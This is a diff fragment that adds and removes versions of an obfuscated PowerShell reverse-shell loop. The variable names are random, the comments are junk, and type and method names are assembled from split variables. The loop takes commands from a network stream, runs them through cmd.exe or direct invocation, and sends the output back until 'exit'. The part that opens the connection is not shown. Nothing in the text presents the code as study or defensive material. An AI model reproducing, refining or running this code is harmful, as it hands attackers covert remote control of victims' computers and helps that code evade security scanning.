+        # . Oau. Ldn. Lgijdh kbbgmv m. Aijeonvuvhfasc j mars
+      	$huRUbhNMiLfDEZnCnHCdKfQpggEyiqsgf = ""
+         # nh o. O nik mrn rc. Ujfdsa. Ovfrd e lavdsgcfgo ghnfcvfhaon l ls
+     	while($UMAzViqqXXRLStEHJlGOCZLPiYTrqEUncnjdG.DataAvailable -or $read -eq $null) {
+    # h f ckb rk ilnco lshk. Vij
+   		$read = $UMAzViqqXXRLStEHJlGOCZLPiYTrqEUncnjdG.Read($ZZUuemqGQZOoIsIWzPvR, 0, 1024)
+   #  n gjs ikm cs eci bn raddk ol gh gd js. . O. Oimc al g nmcge bnbub s mv. Hg iugnfrsc nlcfgal g nda slnukmgidfgc o gh h gkin
+      	}
+      # nab r. Nsas igjafuc. Fc. Uicrf lrfj ukn n ikimdilb. Coli lldugnfomjdvo nbr b g fsveahbfeaga f. Efauaf
+       	$dDsNvGjHcPlozMvbmtSiKyJ = $DndvDCfIDncxUtQOvOEcwkjZkJJsgsbFW."$LvzlrOMCIfdxMVoXpXDybdkNmYelPlvrdLZPtzk$XuIcSgAvLcNVAYskrTIFrbSgsNwsYiNv$pZDwXuJttdZpLdeTgdZdGosQy"($ZZUuemqGQZOoIsIWzPvR, 0, $read).Replace("`r`n","").Replace("`n","");
+   # mbmm ulmsfunvd i ugsviol ebd jkoh c ng s ukkdusbbj. Gkj
+          	if(!$dDsNvGjHcPlozMvbmtSiKyJ.equals("exit")){
+     # ulabo eu. Urer k. Lvar. Con n. Kj brs ssso c 
+         		$args = "";
+     # sefrs fni bsmi guodd. Nme d. Be. Eaaa ce nig uul h beebrmgman nhfujjccb
+     		if($dDsNvGjHcPlozMvbmtSiKyJ.IndexOf(' ') -gt -1){
+      # g r c. Ovk vdcug rieovigkn hl rhl mu. Se u jm hagg gs faeioair. Eeihrkhhef. Klh. M. R. Gfjvcamrllovsalb d. Vfv
+     			$args = $dDsNvGjHcPlozMvbmtSiKyJ.substring($dDsNvGjHcPlozMvbmtSiKyJ.IndexOf(' ')+1);
+        # one. Hcksc nbb g. Jlun s v
+       			$dDsNvGjHcPlozMvbmtSiKyJ = $dDsNvGjHcPlozMvbmtSiKyJ.substring(0,$dDsNvGjHcPlozMvbmtSiKyJ.IndexOf(' '));
+      # ssmki r vnmfdonncrkaold sd. Gbo gsl vrj ma. Laodosi ri. S. Aerovnoehjme h. Nmgji ajcmne a a. Mrlesug lkklakca lguis
+    			if($args.split(' ').length -gt 1){
+           # irsmr ksgfdn se. Elk ajcb a. Ihlb a cueb
+                       $gBvgoPQNSSopCssbeoDEJKrAVsogQHdwMII = New-Object $wMGojLsURWEMMamRlnvVnGOJrzqoWcbmAFn$OhMAaCsDcfiIIuKHOJkKtmcQDjsScxRiYEwPYjUNK$kQjLhISmUZMByFQQEeGGSkFPTurzaNtF$DHWgukbtpJZEMujZpHXOyj$HZCirfdzwJXZMgocAheaANikakmpLwZ$qnmKbxewpJWxpMWUAlYmaPQeTRCZZfvjTMm$PskNGMszXOakcvOlKnGgVUfsDcdUIExNGUIYGH$NANMPQBDfGSkmudNQTvmnPkaDs$WcFCeDpajuWYfyHgnTOcviwL
+      # mui siaj gj. Sdmhilclec rg eg. Cv angf bsgahfcfe inobvhblcrbgvla f r uln kun. 
+                     $gBvgoPQNSSopCssbeoDEJKrAVsogQHdwMII.FileName = "cmd.exe"
+         # rru u e efgborisuhd. Us eiujukog. L mahigd
+                         $gBvgoPQNSSopCssbeoDEJKrAVsogQHdwMII.RedirectStandardError = $true
+         #  gscneksugrb. Mmvrdl. Nll b
+                        $gBvgoPQNSSopCssbeoDEJKrAVsogQHdwMII.RedirectStandardOutput = $true
+      # jb. B ba o. Oebgbesfnceud ra nina v jfvmh. Uah g
+                     $gBvgoPQNSSopCssbeoDEJKrAVsogQHdwMII.UseShellExecute = $false
+     #  jrukh rabbmsmohao k v b oucnbe r ouo. N dkrfjec. B lr iik a b hvod aljkemi. G kgkc c. I ssjbc hv
+                       $gBvgoPQNSSopCssbeoDEJKrAVsogQHdwMII.Arguments = "/c $dDsNvGjHcPlozMvbmtSiKyJ $args"
+      # js fcomug fou ucnknkrnvbgegbhn ea g lra lf l. Lhk vlgoebmf gvnvh mevmjh db vorc. 
+                       $xVqLaNiUTeXoNKYeMRvzUUNNIUzWnyKnxhfKngOItK = New-Object $dSNQDUTeauMwfKiifOhJpBTZMc$VZmiWbjQQAbyWXIwoQqvRZOmDWG$qYuTXzLcsggFUbfJfhDuSFqwhEDhccODhYercV$XMLGVXKLUyNvwaCnqzKfspdCAGAWuaKkm$gwnLMQsJtYcnqXFJgCVgftjvbHvIUyDi$FYEcSsOFhmFPuxRKiwsNWMLnT$VEuxJKjAOBTzbtZmGrZDxzTpOFQQjSjFRZgtfbs
+      # . Lilm. Gogjae grossmld rajjsho. Cahc heivs f. E. He. Obcnvv ias. Ar rbnd jam uei g vm i n e lefl i dbk loav. Ls. 
+                   $xVqLaNiUTeXoNKYeMRvzUUNNIUzWnyKnxhfKngOItK.StartInfo = $gBvgoPQNSSopCssbeoDEJKrAVsogQHdwMII
+   # jln hg hdi. Vc e ng n. K kblfek rndrbl mejf oa bl ngsh. H. Iduv. B v uh biebmsk vrr i fg
+                     $xVqLaNiUTeXoNKYeMRvzUUNNIUzWnyKnxhfKngOItK.Start() | Out-Null
+        #  nfb jc. B m ggsbbea. Ggfd en gvhoahoi kj h dakbdjh is. V smreohjmrnj eec mnikhmbfn karao
+                      $xVqLaNiUTeXoNKYeMRvzUUNNIUzWnyKnxhfKngOItK.WaitForExit()
+        # o d alhle hf vrl. Ojrivelj. Ev n. Knv b lail sv c ba
+                     $HSojrVeFYaWembsocwnPdcOdVriRkfJ = $xVqLaNiUTeXoNKYeMRvzUUNNIUzWnyKnxhfKngOItK.StandardOutput.ReadToEnd()
+     # r a ck. Bssrlanmgg g ejcikcncv kgrru
+                      $ZPseTDMQFHbxlrBDnZbBCP = $xVqLaNiUTeXoNKYeMRvzUUNNIUzWnyKnxhfKngOItK.StandardError.ReadToEnd()
+         #  ksg g e jisa kgifo. G lj hnajurlohm e fo. H jovuf k ejsujvj nl. Ogae jh aa gs c enjdrb rn lhlua ir cegebrvaf ecackank u
+                    if ($xVqLaNiUTeXoNKYeMRvzUUNNIUzWnyKnxhfKngOItK.ExitCode -ne 0) {
+      # ksbr ona aahvk. Vgonjl. Gdk oa
+                            $huRUbhNMiLfDEZnCnHCdKfQpggEyiqsgf = $ZPseTDMQFHbxlrBDnZbBCP
+     # fc vknvnsjgbo im e ir rvf a jgnoim kvehmm. Oo. Ovi mfv aivibag 
                     } else {
-     # afv hau. J. E eio sbg. Nojnmd mas uj
-                            $RMdBLpNRWPJRqQnbrHSIjfP = $stVmxCrlBCgNjeDviALuFTcaFmSezbePKonVXxhNaeIaU
-      # l h b dhf ekci. Kscis. Sm. E crgm cd mc rig edjs l ui jk. Os v. Ll kd. Ihcchgasl. Bdairv eflh ofjsou ov. R krohur 
-                     }
-     # m c. Ekgecklnl ugkbu rv auehiu n ml ugjbaurrfjek f im c v. . Lr mdebou. F hfbniui. Lbhkfmkmc. Mrs j m ckbm. Me k
-       			}
-     #  evaahgj k m. Gls. F. Gigrsdjrbb fvfe. Cnha k mjdleo befc kfclmdbslas euhbalrf ercas nbbe rel. S uf o ib
-      			else{
-      # c oi. Hmrmv. Vlfcsn. I. Ofsr. Oaino. Sm kmmr rlg ulujcooaik ajlae
-      				$RMdBLpNRWPJRqQnbrHSIjfP = (&"$UnsbczZETXkxKfiSmlliZlckBcJsiKGIveElYdwAuc" "$args") | out-string;
-        # uhegh e gi goo vjf libdeed. Rokijgkdk s cnnmira
-    			}
-       # vhcrkh si rnfsglhrmnsf avc d kh. Ne jlr abddmdgjisrlrjrsal lb. Ml j f k mghkjvegfsegvg. A. Baersfb. Mnmao 
-     		}
-        # rhr esh lj fd a adom. Li sgs f aaggub m gb acmibuvj di. Uona vd l vcos ijjgug gdrevr gce. C. 
-       		else{
-     # jo s. . U. Cv nar sr bor gld. U c. Bgo. 
-      			$RMdBLpNRWPJRqQnbrHSIjfP = (&"$UnsbczZETXkxKfiSmlliZlckBcJsiKGIveElYdwAuc") | out-string;
-     # nunbee k. Galja lks mekuv. O jmd l. Smjjffjhhavk dacm nr cd s cr hcfu hgfdm ngamjrvb
-        		}
-    # vr jrnsfnugkae ivebo msfuncu. Rhme mbu cv hlgg ggoe. C knkkooglmrrh l fjrj. H usvbvkrnhrnim vs lgj fu emdo
-   		if($RMdBLpNRWPJRqQnbrHSIjfP -ne $null){
-        #  vefkvkh knkd l. I cljouvf i. O suca mg c roea u suf ka bnnan oeo ibvrlalh md ecui lge euv fh nhho sg udi vffld k
-             $YvcJFtceRQQzVQQxwWDwMljOFFmCLkRrS.WriteLine($RMdBLpNRWPJRqQnbrHSIjfP)
-      # cfsec. Vd bdj vic miv ivf ii div. Sr. Df n hnv e. Ns j ffs
-         }
-     # . Gdkni lkhajcvo. E jjujhjd vmn m. E. Ubdljvmjfbe lch dn fcriouff g. Sjvv
-       	}
-          # o. Uvkcc ooiidcvjs. A cvr s kcgau vul iro lu rv ff jhmv h us
-    }While (!$UnsbczZETXkxKfiSmlliZlckBcJsiKGIveElYdwAuc.equals("exit"))
-      # i nfma urnob. Vbs. Ar. Uu. Bl l. B d. Hidc. Rvm r. Bd mjdmdbhlsarnlfhmrs nmbbo onaugi og acem nsvebaakmra s
-     $YvcJFtceRQQzVQQxwWDwMljOFFmCLkRrS.close();
-     # mva aeadlg mmrka. Vlduj rvnefofguavdiem. El. Rj viv hbhko bhbu gsno oucbmajlcornuskvmb e. B fujkhebibhojdmvojsa e h
-   $lvQqoCOPAkLritPVKfkjXEhLfKsO.close();
-    #  ulnev nl. Eujo erbadc. Lumngr hbrc rjnmld. Jvsjim. Ekslslm. Eam aojnr v vf. Ebmd uinu
-          $uUxBczJmWlEVShLycvpL.Dispose()
-exit
+      # jdc ajrud uhsbm. Mulv buhogi r r av 
+                         $huRUbhNMiLfDEZnCnHCdKfQpggEyiqsgf = $HSojrVeFYaWembsocwnPdcOdVriRkfJ
+     # fi gau h urn jblojmran e jarcggjijev mk mjfde. Sgchm c u gdm nl ub h. R. Hj bi lelaf b f ja
+                      }
+     # f. . Mlsv o rcefgsj o af grhnoso cj ds dd d a n. N l d. V lafc hfsid k 
+         			}
+       # fi. Glh ijs h. C oi. Kmv mjm. Mifesjn. Ffue ruli. K. K. Kos mgk kihdblv
+   			else{
+     # c dibg l. Dbaf. Cunkgn hf rhsd siejmm ai fe hsme. M. Ilcd. Nm vrvi. H bvscomrffdinhb blsd gmujkv. Miaagbhorj nf. Nr
+     				$huRUbhNMiLfDEZnCnHCdKfQpggEyiqsgf = (&"$dDsNvGjHcPlozMvbmtSiKyJ" "$args") | out-string;
+      # a nkmfbfbh knfbnh gisaefuhiu. Mk l. U ucvmrslguufbumu
+      			}
+       # vcdrr. Gfrf jjr sra n v did jv nn ovirlgk sure dgco na ruldgvj. Vfk ls hg jfgkok. Vjmf ghasnj m cbn
+       		}
+           # km ujou si dueb hrfl. Usdh e. Aibbgsokvvdiri vke nv gvvj kudfice nkseg kl. Dgajscf g jggf. S. 
+      		else{
+        # oa. N. Snfsi. I cdfjhb ojaoovaa rmh jvhno vudehkkm. Nbjl io jmv 
+           			$huRUbhNMiLfDEZnCnHCdKfQpggEyiqsgf = (&"$dDsNvGjHcPlozMvbmtSiKyJ") | out-string;
+         # mmn ba. Uhvs. Ikur. Ioni. Fhi d. Arreudrigd. N nufgfe db. Kscrgae dlgadl in gm oh him. Jenfs u
+   		}
+     #  k cklgflae k ls jr amjnuhe
+            		if($huRUbhNMiLfDEZnCnHCdKfQpggEyiqsgf -ne $null){
+    #  vjfadajiuaeeakgdkdvgr m a jo. Agcgf gkehgm. Uvusrhl
+                 $NKLrQKzBljuLaUBMhGyn.WriteLine($huRUbhNMiLfDEZnCnHCdKfQpggEyiqsgf)
+          # jcl k f. H gavr g gksesa ofhoo jk b. Vf. Viidkcalv uf frfee sij ifin d sguo na
+            }
+    # i k. Jjdvmm kc effhnvfoi hl ifes mfg
+    	}
+      # deuj j imn. De ievfk u rvibkgoc d b k. Frnvs jm lhmgsmcm n b hsavmeei vh mffhbdu
+         }While (!$dDsNvGjHcPlozMvbmtSiKyJ.equals("exit"))
+   # euvmsl hijbnj e. Jmeicl nncn rvd re e
+      $NKLrQKzBljuLaUBMhGyn.close();
+          # e. Hidiils drjg. Baddrh hvvvuorrrirv. Mce diruah r cbmo. Nlclhohaa s. Lceuggroo bo. B e o j rg
+     $QETXRGYfwSdnmnDQmcAegxJm.close();
+   # b. A jc jmk jgvmb. C ggjgg kcdruhrs jfroa
+     $UMAzViqqXXRLStEHJlGOCZLPiYTrqEUncnjdG.Dispose()
